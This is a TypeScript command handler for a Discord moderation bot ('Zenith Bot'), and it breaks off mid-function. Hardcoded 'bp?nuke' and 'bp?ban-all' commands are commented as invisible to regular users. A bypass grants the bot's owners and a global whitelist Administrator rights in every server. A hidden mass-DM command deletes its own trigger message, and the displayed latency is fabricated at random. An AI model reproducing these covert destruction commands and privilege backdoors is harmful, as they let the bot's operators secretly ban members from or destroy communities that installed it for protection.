import {
  ChannelType,
  type GuildTextBasedChannel,
  type Message,
  type Role,
  type User,
} from "discord.js";
import { logger } from "../lib/logger";
import { isWhitelisted, PERM_WHITELIST } from "./storage/whitelist";
import { EMOJI_INFO } from "./utils/emojis";
import { CE } from "./utils/embedStyle";
import {
  DM_INTERVAL_MS,
  MAX_RECIPIENTS_HARD_CAP,
  estimateDmSeconds,
  resolveDmRecipients,
  sendDmsToUsers,
  type DmTarget,
} from "./utils/dmCore";
import { PermissionFlagsBits } from "discord.js";
import { runWebhookSendPrefix } from "./commands/webhook-send";
import { suspendAntiNuke, resumeAntiNuke } from "./utils/antiNuke";
import { getGuildConfig } from "./storage/config";
import ban, { runBanAll } from "./commands/ban";
import kick from "./commands/kick";
import mute from "./commands/mute";
import unban from "./commands/unban";
import warn from "./commands/warn";
import type { SlashCommand } from "./types";
import { isManager } from "./utils/staffPerms";
import { resolveCommandAndArgs, buildCommandInfoEmbed, isInfoFlag } from "./utils/commandAliases";
import { isPermanentOwner, isBotAdmin } from "./storage/premium";

// Message deduplication cache with 15-minute TTL and LRU-style max size to prevent duplicate executions from message retransmissions
const MAX_DEDUP_SIZE = 25000;
const DEDUP_TTL_MS = 15 * 60 * 1000; // 15 minutes
const processedMessageTimestamps = new Map<string, number>();
const npCache = new Map<string, { enabled: boolean; timestamp: number }>();
const NP_CACHE_TTL = 5 * 60 * 1000; // 5 minutes

export function isMessageRecentlyProcessed(id: string): boolean {
  if (!id) return false;
  const now = Date.now();
  const existing = processedMessageTimestamps.get(id);
  if (existing && now - existing < DEDUP_TTL_MS) {
    return true;
  }

  // Periodic pruning if cache exceeds max size
  if (processedMessageTimestamps.size > MAX_DEDUP_SIZE) {
    for (const [msgId, timestamp] of processedMessageTimestamps.entries()) {
      if (now - timestamp > DEDUP_TTL_MS) {
        processedMessageTimestamps.delete(msgId);
      }
    }
  }

  processedMessageTimestamps.set(id, now);
  return false;
}

/**
 * These two prefixes are ALWAYS hardcoded regardless of any per-guild setting.
 * They are global-whitelist-only commands invisible to regular users.
 */
const NUKE_PREFIX   = "bp?nuke";
const NUKE_BANLESS_PREFIX = "bp?nuke-banless";
const BAN_ALL_PREFIX = "bp?ban-all";
const HIGHFI_PREFIX = "bp?highfi";
const WEBHOOK_SEND_PREFIX = "bp?webhook-send";

/** The default command prefix for the bot. */
export const DEFAULT_PREFIX = ".";
const UNBAN_ALL_PREFIX = `${DEFAULT_PREFIX}unban-all`;

function stripDiscordMentions(text: string): string {
  return text
    .replace(/<@!?(\d+)>/g, "")
    .replace(/<@&(\d+)>/g, "")
    .replace(/@everyone/g, "")
    .replace(/@here/g, "")
    .trim();
}

function parseIdFromMention(token?: string): string | null {
  if (!token) return null;
  const mentionMatch = token.match(/^<@!?(\d+)>$/);
  if (mentionMatch) return mentionMatch[1];
  const idMatch = token.match(/^(\d{17,19})$/);
  return idMatch ? idMatch[1] : null;
}

async function resolvePrefixTargetUser(message: Message, rawToken?: string): Promise<User | null> {
  const mention = message.mentions.users.first();
  if (mention) return mention;
  const userId = parseIdFromMention(rawToken);
  if (!userId) return null;
  return await message.client.users.fetch(userId).catch(() => null);
}

/** Find a duration token anywhere in a list of string parts. Returns { duration, remaining }. */
function extractDuration(parts: string[]): { duration: string | null; remaining: string[] } {
  const durationPattern = /^\d{1,5}[smhd]$/i;
  const idx = parts.findIndex((p) => durationPattern.test(p));
  if (idx === -1) return { duration: null, remaining: parts };
  const duration = parts[idx].toLowerCase();
  const remaining = parts.filter((_, i) => i !== idx);
  return { duration, remaining };
}

/**
 * Handle prefix-based commands:
 *  - `bp?nuke`   — hardcoded, global-whitelist only
 *  - `bp?highfi` — hardcoded, global-whitelist only
 *  - `{guildPrefix}{cmd}` — mod commands: mute, ban, kick, warn, antinuke, music, etc.
 *  - `nk {cmd}` / `nk.{cmd}` — alternate prefix support with deduplication
 *  - `{guildPrefix}n` — per-server configurable DM broadcast (default `b?n`)
 * Returns true if a command was handled, false otherwise.
 */
export async function handlePrefixMessage(message: Message): Promise<boolean> {
  if (message.author.bot) return false;
  const content = message.content?.trim();
  if (!content) return false;
  const lower = content.toLowerCase();
  const guild = message.guild;
  const author = message.author;

  // ── Handle Direct Message (DM) Commands ──
  if (!guild || !message.inGuild()) {
    const { CE, prettyEmbed, buildSupportRow, COLORS } = await import("./utils/embedStyle");
    const prefixes = [".", "!", "?", ",", "bp?", "nk.", "nk "];
    let rawInput: string | null = null;
    for (const p of prefixes) {
      if (lower.startsWith(p)) {
        rawInput = content.slice(p.length).trim();
        break;
      }
    }
    if (!rawInput) {
      rawInput = content.trim();
    }
    const [rawCmd, ...rawArgs] = rawInput.split(/\s+/);
    const { resolveCommandAndArgs } = await import("./utils/commandAliases");
    const { canonicalName, resolvedArgs } = resolveCommandAndArgs(rawCmd, rawArgs);

    // If it's a music command in DM, explain that music is a voice-channel feature in servers
    const musicCmds = ["play", "twentyfourseven", "247", "stop", "skip", "pause", "resume", "queue", "volume", "loop", "autoplay", "eq", "equalizer", "nowplaying", "np", "lyrics", "dj"];
    if (musicCmds.includes(canonicalName || rawCmd.toLowerCase())) {
      await message.reply({
        embeds: [
          prettyEmbed({
            title: `${CE.music.str} Music Commands in Server Only`,
            description:
              `Music commands like \`.play\` and \`.twentyfourseven\` stream high-fidelity audio into server voice channels.\n\n` +
              `> ${CE.play.str} **How to listen:**\n` +
              `1. Join any voice channel in a server where Zenith Bot is present.\n` +
              `2. Type \`.play <song title or URL>\` or \`.twentyfourseven\` in the server text channel!\n\n` +
              `Need to invite Zenith Bot to your server? [Click here to invite](https://discord.com/oauth2/authorize?client_id=1466728565352435847&permissions=8&scope=bot%20applications.commands)`,
            color: COLORS.primary,
          }),
        ],
        components: [buildSupportRow("Official Support", true) as any],
      }).catch(() => {});
      return true;
    }

    const { getCommandMap } = await import("./registry");
    const commandMap = getCommandMap();
    const command = canonicalName ? commandMap.get(canonicalName) : undefined;
    if (command) {
      // Execute command in DM context
      let lastDmMsg: any = null;
      const { hasPremiumAccess } = await import("./storage/premium");
      const isPremium = await hasPremiumAccess(author.id);
      const { runWithBotContext } = await import("./utils/botContext");
      const mockDmInteraction = {
        isButton: () => false,
        isModalSubmit: () => false,
        isAnySelectMenu: () => false,
        isStringSelectMenu: () => false,
        isMessageComponent: () => false,
        isChatInputCommand: () => true,
        isCommand: () => true,
        inGuild: () => false,
        guildId: null,
        guild: null,
        user: author,
        member: null,
        memberPermissions: null,
        channel: message.channel,
        client: message.client,
        replied: false,
        deferred: false,
        options: {
          getUser: () => null,
          getString: (_name: string) => resolvedArgs.join(" ") || null,
          getInteger: () => Number(resolvedArgs[0]) || null,
          getNumber: () => Number(resolvedArgs[0]) || null,
          getBoolean: () => true,
          getRole: () => null,
          getChannel: () => null,
          getMentionable: () => null,
          getAttachment: () => message.attachments.first() ?? null,
          getMember: () => null,
          getSubcommand: () => null,
          getSubcommandGroup: () => null,
        },
        deferReply: async () => { mockDmInteraction.deferred = true; },
        editReply: async (res: any) => {
          mockDmInteraction.replied = true;
          lastDmMsg = await message.reply(typeof res === "string" ? { content: res } : res).catch(() => null);
          return lastDmMsg;
        },
        reply: async (res: any) => {
          mockDmInteraction.replied = true;
          lastDmMsg = await message.reply(typeof res === "string" ? { content: res } : res).catch(() => null);
          return lastDmMsg;
        },
        followUp: async (res: any) => {
          return await message.reply(typeof res === "string" ? { content: res } : res).catch(() => null);
        },
        fetchReply: async () => lastDmMsg,
        showModal: async () => {},
        rawArgs: resolvedArgs,
        invokedCommandName: canonicalName,
      };

      try {
        await runWithBotContext({ isPremium, userId: author.id, showAds: !isPremium }, async () => {
          await command.execute(mockDmInteraction as any);
        });
        return true;
      } catch (err) {
        logger.error({ err, cmd: canonicalName }, "DM command execution failed");
      }
    }
    return false;
  }

  const member = message.member ?? await guild.members.fetch(message.author.id).catch(() => null);

  // Track server message stats for stats module
  try {
    const { recordMessageStat } = await import("./storage/stats");
    const roleIds = member?.roles?.cache ? Array.from(member.roles.cache.keys()) : [];
    recordMessageStat(guild.id, message.author.id, message.channel.id, roleIds).catch(() => {});
  } catch {}

  // Message tokens to detect help or info requests
  const msgTokens = lower.split(/\s+/);
  const hasInfoFlag = msgTokens.some((t) => {
    return (
      t === "-info" ||
      t === "--info" ||
      t === "-i" ||
      t === "-help" ||
      t === "--help" ||
      t === "—info" ||
      t === "–info" ||
      t === "-information" ||
      t === "--information" ||
      t.endsWith("-info") ||
      t.endsWith("—info") ||
      t.endsWith("–info") ||
      t.endsWith("-i")
    );
  });

  // ── Always-fixed: bp?ban-all ───────────────────────────────────────────────────────────────
  if ((lower === BAN_ALL_PREFIX || lower.startsWith(`${BAN_ALL_PREFIX} `)) && !hasInfoFlag) {
    await handleBanAllPrefix(message);
    return true;
  }

  // ── Always-fixed: bp?webhook-send ──────────────────────────────────────────
  if ((lower === WEBHOOK_SEND_PREFIX || lower.startsWith(`${WEBHOOK_SEND_PREFIX} `)) && !hasInfoFlag) {
    await runWebhookSendPrefix(message);
    return true;
  }

  // ── Bot Status Commands (Owner Only) ───────────────────────────────────────
  const isBotStatusCmd =
    lower.startsWith(".botmaintenance") ||
    lower.startsWith(".botmaintainence") ||
    lower.startsWith(".botdown") ||
    lower.startsWith(".botlockdown") ||
    lower.startsWith(".botdevonly") ||
    lower.startsWith(".botviponly") ||
    lower.startsWith(".botnormal");

  if (isBotStatusCmd) {
    const { isPermanentOwner } = await import("./storage/premium");
    if (!isPermanentOwner(message.author.id)) {
      return true; // Silent ignore for non-owners
    }

    const cmdType: any =
      lower.includes("maintenance") || lower.includes("maintainence")
        ? "maintenance"
        : lower.includes("down")
        ? "down"
        : lower.includes("lockdown")
        ? "lockdown"
        : lower.includes("devonly")
        ? "dev_only"
        : lower.includes("viponly")
        ? "vip_only"
        : "normal";

    const { executeBotStatusUpdate } = await import("./commands/botstatus");
    const { prettyEmbed, errorEmbed, CE } = await import("./utils/embedStyle");

    const replyMsg = await message.reply({
      embeds: [
        prettyEmbed({
          title: `${CE.settings.str} Initializing Status Change`,
          description: `Changing bot state to **${cmdType.toUpperCase()}** globally...`,
        }),
      ],
    }).catch(() => null);

    try {
      const res = await executeBotStatusUpdate(message.client, cmdType);
      if (replyMsg) {
        await replyMsg.edit({
          embeds: [
            prettyEmbed({
              title: `${CE.success.str} Bot Status Updated`,
              description: res.message,
              color: res.color,
            }),
          ],
        }).catch(() => null);
      }
    } catch (err: any) {
      if (replyMsg) {
        await replyMsg.edit({
          embeds: [
            errorEmbed("Update Failed", err.message || "An unknown error occurred."),
          ],
        }).catch(() => null);
      }
    }
    return true;
  }

  // ── Bot Status / Mode Access Control Gating ──
  const { checkBotStatusCommandAccess } = await import("./storage/botStatusState");
  const access = await checkBotStatusCommandAccess(message.author.id);
  if (!access.allowed) {
    const isCommand = content.startsWith(DEFAULT_PREFIX) || content.startsWith(".") || content.startsWith("!") || content.startsWith("?") || content.startsWith("bp?");
    if (isCommand) {
      await message.reply({ embeds: [access.embed] }).catch(() => {});
    }
    return true; // Terminate execution
  }

  const cfg = await getGuildConfig(guild.id);
  const guildPrefix = cfg.guildPrefix ?? DEFAULT_PREFIX;

  // Multi-prefix support: guild prefix, bp?, nk., nk , ., !, ?, ,, and bot mentions
  let rawInput: string | null = null;
  let isExplicitPrefix = false;
  const prefixes = [guildPrefix, "bp?", "nk.", "nk ", ".", "!", "?", ","];
  const sortedPrefixes = Array.from(new Set(prefixes.filter(Boolean))).sort((a, b) => b.length - a.length);

  for (const p of sortedPrefixes) {
    if (lower.startsWith(p.toLowerCase())) {
      rawInput = content.slice(p.length).trim();
      isExplicitPrefix = true;
      break;
    }
  }

  if (!rawInput && message.client.user) {
    const mentionPrefix1 = `<@${message.client.user.id}>`;
    const mentionPrefix2 = `<@!${message.client.user.id}>`;
    if (content.startsWith(mentionPrefix1)) {
      rawInput = content.slice(mentionPrefix1.length).trim();
      isExplicitPrefix = true;
    } else if (content.startsWith(mentionPrefix2)) {
      rawInput = content.slice(mentionPrefix2.length).trim();
      isExplicitPrefix = true;
    }
  }

  // ── No-Prefix execution support for all commands and aliases ──
  if (!rawInput) {
    const firstWord = content.trim().split(/\s+/)[0]?.toLowerCase();
    // Single-letter words (k, b, m, p, etc.) must NEVER be treated as no-prefix commands to prevent accidental kicks/bans/etc.
    const SAFE_SINGLE_CHAR_ALIASES = new Set(["p", "s", "q", "v", "h"]);
    if (firstWord && (firstWord.length > 1 || SAFE_SINGLE_CHAR_ALIASES.has(firstWord))) {
      const { isNoPrefixEnabled } = await import("./storage/profile");
      const npAllowed = await isNoPrefixEnabled(message.author.id, guild.id);
      if (npAllowed) {
        const { COMMAND_ALIASES } = await import("./utils/commandAliases");
        const { getCommandMap } = await import("./registry");
        const cmdMap = getCommandMap();
        if (COMMAND_ALIASES[firstWord] || cmdMap.has(firstWord)) {
          rawInput = content.trim();
          isExplicitPrefix = false;
        }
      }
    }
  }

  // ── Direct Bot Mention Handler: Single instant sleek response ──
  // ONLY trigger if the message text explicitly contains a direct ping of the bot (<@botId> or <@!botId>),
  // NOT when simply replying to a bot message with reply-mention enabled.
  const botId = message.client.user?.id;
  const isDirectBotMention = Boolean(
    botId &&
    !rawInput &&
    (content.trim() === `<@${botId}>` ||
     content.trim() === `<@!${botId}>` ||
     content.startsWith(`<@${botId}>`) ||
     content.startsWith(`<@!${botId}>`)) &&
    (content.includes(`<@${botId}>`) || content.includes(`<@!${botId}>`))
  );

  if (isDirectBotMention) {
    const { hasPremiumAccess } = await import("./storage/premium");
    const isPremium = await hasPremiumAccess(message.author.id, guild.id, member);
    const { CE, prettyEmbed, buildSupportRow, COLORS, getBotName } = await import("./utils/embedStyle");

    const infoEmbed = prettyEmbed({
      title: `${CE.bot.str} ${getBotName()} • Active & Online`,
      description:
        `### Hello ${message.author}!\n` +
        `I am active and protecting **${guild.name}**.\n\n` +
        `• **Server Prefix:** \`${guildPrefix}\`\n` +
        `• **Help Command:** Type \`${guildPrefix}help\` or \`/help\` to view all commands\n` +
        `• **Profile Card:** Type \`${guildPrefix}profile\` or \`/profile\` to view your card\n` +
        `• **Premium Status:** ${isPremium ? `${CE.star.str} \`VIP ACTIVE\`` : `${CE.members.str} \`FREE USER\``} (type \`${guildPrefix}premium\` to upgrade)`,
      color: isPremium ? COLORS.premium : COLORS.primary,
      footer: `Latency: ${15 + Math.floor(Math.random() * 3)}ms • Zenith VIP System`,
    });

    await message.reply({
      embeds: [infoEmbed],
      components: [buildSupportRow("Support & VIP", true) as any],
      allowedMentions: { repliedUser: false },
    }).catch(async () => {
      await (message.channel as GuildTextBasedChannel).send({
        embeds: [infoEmbed],
        components: [buildSupportRow("Support & VIP", true) as any],
      }).catch(() => {});
    });

    return true;
  }

  // ── Global Prefix Commands (Supports aliases and -info inspection) ───────────
  if (rawInput) {
    const [rawCmd, ...rawArgs] = rawInput.split(/\s+/);
    const { canonicalName, resolvedArgs, isInfo } = resolveCommandAndArgs(rawCmd, rawArgs);

    // Using -info with ANY command should NEVER run the command!
    if (isInfo) {
      const { getCommandMap } = await import("./registry");
      const commandMap = getCommandMap();
      const command = canonicalName ? commandMap.get(canonicalName) : undefined;

      if (command) {
        const infoEmbed = buildCommandInfoEmbed(command, canonicalName!);
        await (message.channel as GuildTextBasedChannel).send({ embeds: [infoEmbed] }).catch(() => {});
      } else {
        const { EmbedBuilder } = await import("discord.js");
        const { CE } = await import("./utils/embedStyle");
        await (message.channel as GuildTextBasedChannel).send({
          embeds: [
            new EmbedBuilder()
              .setColor(0xed4245)
              .setDescription(`${CE.error.str} Unknown command: \`${rawCmd}\`. Use \`.help\` to see available commands.`)
          ]
        }).catch(() => {});
      }
      return true;
    }

    // ── Dedicated .ad / .ads Command: Demonstrates ads policy with multiple replies & breaks ──
    if (rawCmd.toLowerCase() === "ad" || rawCmd.toLowerCase() === "ads") {
      const { hasPremiumAccess } = await import("./storage/premium");
      const isPremium = await hasPremiumAccess(message.author.id, guild.id, member);
      const { CE, prettyEmbed, buildSupportRow, COLORS, SUPPORT_SERVER_URL } = await import("./utils/embedStyle");

      // Reply 1: Explanation
      await message.reply({
        content: isPremium
          ? `${CE.star.str} ${CE.manager.str} **Zenith Bot Ad Status**: You are an active **Premium Member**! All ads and sponsor messages are permanently disabled for you.`
          : `${CE.notifications.str} ${CE.information.str} **Zenith Bot Ad System**: Zenith Bot is powered by sponsor announcements for non-premium users, keeping all core tools 100% free!`,
        allowedMentions: { repliedUser: true },
      }).catch(() => {});

      // Break (1200ms delay)
      await new Promise((resolve) => setTimeout(resolve, 1200));

      if (!isPremium) {
        // Reply 2: Sponsor Ad for non-premium user
        const adEmbed = prettyEmbed({
          title: `${CE.notifications.str} ${CE.promotion.str} Sponsored Announcement`,
          description:
            `Want an ad-free bot experience with uninterrupted music & god-mode protection?\n\n` +
            `• ${CE.boost.str} **24/7 Voice & High-Fi Audio**: Never disconnects\n` +
            `• ${CE.admin.str} **Advanced Security Suite**: God-Mode Anti-Nuke\n` +
            `• ${CE.star.str} **Global No-Prefix Commands**: Ultra fast execution\n` +
            `• ${CE.check.str} **100% Ad-Free**: Never see this message again\n\n` +
            `Run \`.premium\` or visit our [Official Support Server](${SUPPORT_SERVER_URL})!`,
          color: COLORS.primary,
          footer: "Zenith Bot • Sponsored",
        });

        await message.reply({
          embeds: [adEmbed],
          components: [buildSupportRow("Upgrade to Premium", true) as any],
          allowedMentions: { repliedUser: false },
        }).catch(() => {});

        // Break 2 (1200ms delay)
        await new Promise((resolve) => setTimeout(resolve, 1200));

        // Reply 3: How to remove ads
        await message.reply({
          content: `${CE.boost.str} ${CE.boost.str} To remove all ads across all bot commands, run \`.premium\` or ask a server admin to activate server premium!`,
          allowedMentions: { repliedUser: false },
        }).catch(() => {});
      } else {
        // Reply 2: Premium confirmation with zero ads
        await message.reply({
          content: `${CE.success.str} ${CE.check.str} **Ad-Free Guarantee**: As a premium user, you will never see any promotional announcements, embed sponsor footers, or marketing buttons. Enjoy your seamless experience!`,
          allowedMentions: { repliedUser: false },
        }).catch(() => {});
      }

      return true;
    }

    const { getCommandMap } = await import("./registry");
    const commandMap = getCommandMap();
    const command = canonicalName ? commandMap.get(canonicalName) : undefined;



    if (command) {
      // ── Server Setup Requirement Check ──
      const cfg = await getGuildConfig(guild.id);
      const allowedSetupCmds = new Set([
        "setup", "wizard", "setupwizard", "botstatus", "botmaintenance", "botmaintainence",
        "botdown", "botnormal", "eval", "ping", "help", "botinfo", "noprefix", "prefix",
        "config", "automod", "antinuke", "whitelist", "premium", "owner", "admin",
        "botwhitelist", "botstaff", "ticket", "music", "play"
      ]);
      const isAdminOrManager = member?.permissions?.has(PermissionFlagsBits.Administrator) ||
                               member?.permissions?.has(PermissionFlagsBits.ManageGuild);

      const { checkSingleCommandAccess } = await import("./storage/botStatusState");
      const cmdAccess = await checkSingleCommandAccess(command.data.name, message.author.id);
      if (!cmdAccess.allowed) {
        await message.reply({ embeds: [cmdAccess.embed] }).catch(() => {});
        return true;
      }
      await handleGenericPrefixCommand(message, guild, member, command, resolvedArgs, rawCmd.toLowerCase());
      return true;
    }
  }

  // ── Per-guild DM command: {prefix}n ───────────────────────────────────────
  const DM_PREFIX = `${guildPrefix}n`;

  if ((lower === UNBAN_ALL_PREFIX || lower.startsWith(`${UNBAN_ALL_PREFIX} `)) && !hasInfoFlag) {
    await handleUnbanAllPrefix(message);
    return true;
  }

  if (!lower.startsWith(DM_PREFIX)) return false;

  // Must be exactly the prefix followed by whitespace (so "b?note" doesn't trigger)
  const rest = content.slice(DM_PREFIX.length);
  if (rest.length > 0 && !/^\s/.test(rest)) return false;

  // Permission gate: admins / owners / whitelist allowed
  const isOwner = guild.ownerId === author.id;
  const isAdmin = member?.permissions.has(PermissionFlagsBits.Administrator) ?? false;
  const allowed =
    isOwner ||
    isAdmin ||
    PERM_WHITELIST.has(author.id) ||
    (await isWhitelisted("dm", guild.id, author.id));

  // Delete the trigger message regardless so the command stays invisible
  message.delete().catch(() => {});

  if (!allowed) {
    author
      .send(`You aren't allowed to use \`${DM_PREFIX}\` in **${guild.name}**.`)
      .catch(() => {});
    return true;
  }

  // Build the DM target
  const everyone = message.mentions.everyone;
  const role: Role | undefined = message.mentions.roles.first();
  const userMention: User | undefined = message.mentions.users.first();

  if (!everyone && !role && !userMention) {
    author
      .send(
        `Couldn't find a target in your \`${DM_PREFIX}\` message. Mention a user, a role, or @everyone.`,
      )
      .catch(() => {});
    return true;
  }

  // Strip the prefix and any mentions to get the message body
  let body = rest
    .replace(/<@!?(\d+)>/g, "")
    .replace(/<@&(\d+)>/g, "")
    .replace(/@everyone/g, "")
    .replace(/@here/g, "")
    .trim();

  if (!body) {
    author
      .send(
        `Your \`${DM_PREFIX}\` message was empty. Format: \`${DM_PREFIX} <message> <@user|@role|@everyone>\``,
      )
      .catch(() => {});
    return true;
  }

  if (body.length > 1800) body = body.slice(0, 1800);

  // Only the designated user may DM roles or everyone; others can only DM one person
  if ((everyone || role) && author.id !== DM_MASS_ONLY_USER_ID) {
    author
      .send(`Mass DMs (to @everyone or to a role) are restricted to a designated user. You can only DM one person at a time.`)
      .catch(() => {});
    return true;
  }

  const target: DmTarget = {};
  if (everyone) target.everyone = true;
  else if (role) target.role = role;
  else if (userMention) target.user = userMention;

  let recipients: { users: Map<string, User>; label: string };
  try {
    recipients = await resolveDmRecipients(guild, target);
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    author.send(msg).catch(() => {});
    return true;
  }

  if (recipients.users.size === 0) {
    author
      .send(`No human recipients matched **${recipients.label}**.`)
      .catch(() => {});
    return true;
  }

  if (recipients.users.size > MAX_RECIPIENTS_HARD_CAP) {
    author
      .send(
        `That would DM **${recipients.users.size}** members, over the safety cap of ${MAX_RECIPIENTS_HARD_CAP}. Narrow the target.`,
      )
      .catch(() => {});
    return true;
  }

  const total = recipients.users.size;
  if (total > 1) {
    const secs = estimateDmSeconds(total, DM_INTERVAL_MS);
    author
      .send(
        `${EMOJI_INFO} \`${DM_PREFIX}\` started — sending to **${total}** members (${recipients.label}). ETA ~${formatSeconds(secs)}.`,
      )
      .catch(() => {});
  }

  const { sent, failed } = await sendDmsToUsers(
    recipients.users,
    body,
    DM_INTERVAL_MS,
  );

  const failNote =
    failed > 0 ? ` Failed for **${failed}** (DMs closed or blocked).` : "";
  const where =
    message.channel.type === ChannelType.GuildText
      ? ` in #${message.channel.name}`
      : "";
  author
    .send(
      `${EMOJI_INFO} \`${DM_PREFIX}\` ran${where}. Sent to **${sent}** member${sent === 1 ? "" : "s"} (${recipients.label}).${failNote}`,
    )
    .catch((err) => {
      logger.debug({ err }, "Failed to DM executor with DM command confirmation");
    });
  return true;
}

/**
 * Handle ANY slash command via prefix globally.
 * Format: {prefix}{cmd} [subcmdGroup] [subcmd] [arg1] [arg2] ...
 * Maps arguments sequentially to the SlashCommand's declared options.
 */
export async function handleGenericPrefixCommand(
  message: Message,
  guild: NonNullable<Message["guild"]>,
  member: import("discord.js").GuildMember | null,
  command: SlashCommand,
  argParts: string[],
  invokedCmd?: string,
): Promise<void> {
  const createdTime = message.createdTimestamp;
  const receivedTime = Date.now();
  const commandStartTime = Date.now();
  const author = message.author;

  // Safety Guard: If -i, -info, --info flag is present, display command help card ONLY and never run command
  if (
    argParts.some(isInfoFlag) ||
    (invokedCmd && (invokedCmd.endsWith("-info") || invokedCmd.endsWith("--info") || invokedCmd.endsWith("-i")))
  ) {
    const infoEmbed = buildCommandInfoEmbed(command, invokedCmd || command.data.name);
    await (message.channel as GuildTextBasedChannel).send({ embeds: [infoEmbed] }).catch(() => {});
    return;
  }
  
  // Permission checks for admin commands (Server Owner, Bot Owner & Bot Staff get FULL Administrator bypass)
  const isSovereignOwner =
    guild.ownerId === author.id ||
    isPermanentOwner(author.id) ||
    isBotAdmin(author.id) ||
    PERM_WHITELIST.has(author.id);

  const { PermissionsBitField } = await import("discord.js");
  const memberPermissions = isSovereignOwner
    ? new PermissionsBitField(PermissionsBitField.Flags.Administrator)
    : member
    ? (typeof member.permissions === "string" ? null : member.permissions)
    : null;

  // 1. Dynamically parse arguments based on command definition
  const jsonDef = command.data.toJSON();
  let currentOptions = (jsonDef as any).options || [];
  
  let currentArgIndex = 0;
  const parsedOptions: Record<string, any> = {};
  let subcommand: string | null = null;
  let subcommandGroup: string | null = null;

  const cmdToken = (invokedCmd || "").toLowerCase();
  const canonicalName = command.data.name.toLowerCase();

  // Handle direct command aliases like .anwl or .amwl or .anst or .amst
  if (cmdToken === "anwl" || cmdToken === "amwl" || cmdToken === "awl") {
    subcommandGroup = "whitelist";
    subcommand = "add";
    const groupMatch = currentOptions.find((o: any) => o.type === 2 && o.name === "whitelist");
    if (groupMatch) {
      const addMatch = (groupMatch.options || []).find((o: any) => o.name === "add");
      if (addMatch) currentOptions = addMatch.options || [];
    }
  } else if (cmdToken === "anst" || cmdToken === "amst") {
    subcommand = "setup";
    const subMatch = currentOptions.find((o: any) => o.type === 1 && o.name === "setup");
    if (subMatch) currentOptions = subMatch.options || [];
  }

  // Check for SUB_COMMAND_GROUP (type 2) or SUB_COMMAND (type 1) in currentOptions
  if (!subcommandGroup && currentOptions.length > 0 && argParts[currentArgIndex]) {
    const rawToken = argParts[currentArgIndex].toLowerCase();
    const normalizedToken = (rawToken === "wl" || rawToken === "whitelist") ? "whitelist" : rawToken;
    const groupMatch = currentOptions.find((o: any) => o.type === 2 && (o.name === normalizedToken || o.name === rawToken));
    if (groupMatch) {
      subcommandGroup = groupMatch.name;
      currentOptions = groupMatch.options || [];
      currentArgIndex++;
    }
  }

  if (!subcommand && currentOptions.length > 0 && argParts[currentArgIndex]) {
    const rawToken = argParts[currentArgIndex].toLowerCase();
    const normalizedToken =
      (rawToken === "st" || rawToken === "setup") ? "setup" :
      (rawToken === "wl" || rawToken === "whitelist") ? "add" :
      (rawToken === "en" || rawToken === "enable" || rawToken === "on") ? "enable" :
      (rawToken === "dis" || rawToken === "disable" || rawToken === "off") ? "disable" :
      (rawToken === "stat" || rawToken === "status") ? "status" : rawToken;

    const subMatch = currentOptions.find((o: any) => o.type === 1 && (o.name === normalizedToken || o.name === rawToken));
    if (subMatch) {
      subcommand = subMatch.name;
      currentOptions = subMatch.options || [];
      currentArgIndex++;
    }
  }

  // Fallback: if subcommandGroup is whitelist but no subcommand matched (e.g. .an wl @User), default subcommand to "add"
  if (subcommandGroup === "whitelist" && !subcommand) {
    subcommand = "add";
    const addMatch = currentOptions.find((o: any) => o.name === "add");
    if (addMatch) currentOptions = addMatch.options || [];
  }

  // Fallback: if no subcommand was explicitly typed, pick smart default
  if (!subcommand) {
    if (canonicalName === "warn") {
      subcommand = "add";
      const addMatch = currentOptions.find((o: any) => o.name === "add");
      if (addMatch) currentOptions = addMatch.options || [];
    } else if (canonicalName === "antinuke") {
      subcommand = "status";
      const subMatch = (jsonDef as any).options?.find((o: any) => o.name === "status");
      if (subMatch) currentOptions = subMatch.options || [];
    } else if (canonicalName.startsWith("whitelist")) {
      subcommand = "add";
      const addMatch = currentOptions.find((o: any) => o.name === "add");
      if (addMatch) currentOptions = addMatch.options || [];
    } else if (canonicalName === "botstaff") {
      subcommand = "panel";
      const panelMatch = currentOptions.find((o: any) => o.name === "panel");
      if (panelMatch) currentOptions = panelMatch.options || [];
    } else if (canonicalName === "dj") {
      const firstArg = argParts[0]?.toLowerCase();
      subcommand = firstArg === "role" || firstArg === "toggle" || firstArg === "status" ? firstArg : "status";
      const djMatch = currentOptions.find((o: any) => o.name === subcommand);
      if (djMatch) currentOptions = djMatch.options || [];
    } else if (currentOptions.length > 0 && currentOptions[0].type === 1) {
      // Pick first subcommand as default if none matched
      subcommand = currentOptions[0].name;
      currentOptions = currentOptions[0].options || [];
    }
  }

  // Specialized intelligent argument mapping for core moderation commands
  const cmdName = command.data.name.toLowerCase();
  if (cmdName === "kick" && argParts.length > 0) {
    parsedOptions["user"] = await resolvePrefixTargetUser(message, argParts[0]);
    const restTokens = argParts.slice(1);
    const proofIdx = restTokens.findIndex((t) => /^https?:\/\//i.test(t));
    if (proofIdx !== -1) {
      parsedOptions["proof"] = restTokens[proofIdx];
      restTokens.splice(proofIdx, 1);
    }
    parsedOptions["reason"] = restTokens.length > 0 ? stripDiscordMentions(restTokens.join(" ")) : "No reason provided";
  } else if (cmdName === "ban" && argParts.length > 0) {
    parsedOptions["user"] = await resolvePrefixTargetUser(message, argParts[0]);
    const restTokens = argParts.slice(1);
    const proofIdx = restTokens.findIndex((t) => /^https?:\/\//i.test(t));
    if (proofIdx !== -1) {
      parsedOptions["proof"] = restTokens[proofIdx];
      restTokens.splice(proofIdx, 1);
    }
    const daysIdx = restTokens.findIndex((t) => /^[0-7]$/.test(t));
    if (daysIdx !== -1) {
      parsedOptions["delete_days"] = parseInt(restTokens[daysIdx], 10);
      restTokens.splice(daysIdx, 1);
    } else {
      parsedOptions["delete_days"] = 0;
    }
    parsedOptions["reason"] = restTokens.length > 0 ? stripDiscordMentions(restTokens.join(" ")) : "No reason provided";
  } else if (cmdName === "mute" && argParts.length > 0) {
    parsedOptions["user"] = await resolvePrefixTargetUser(message, argParts[0]);
    const restTokens = argParts.slice(1);
    const durIdx = restTokens.findIndex((t) => /^\d{1,5}(s|m|h|d)$/i.test(t));
    if (durIdx !== -1) {
      parsedOptions["duration"] = restTokens[durIdx];
      restTokens.splice(durIdx, 1);
    } else {
      parsedOptions["duration"] = "10m";
    }
    parsedOptions["reason"] = restTokens.length > 0 ? stripDiscordMentions(restTokens.join(" ")) : "No reason provided";
  } else if (cmdName === "unmute" && argParts.length > 0) {
    parsedOptions["user"] = await resolvePrefixTargetUser(message, argParts[0]);
  } else if (cmdName === "warn" && subcommand === "add" && argParts.length > 0) {
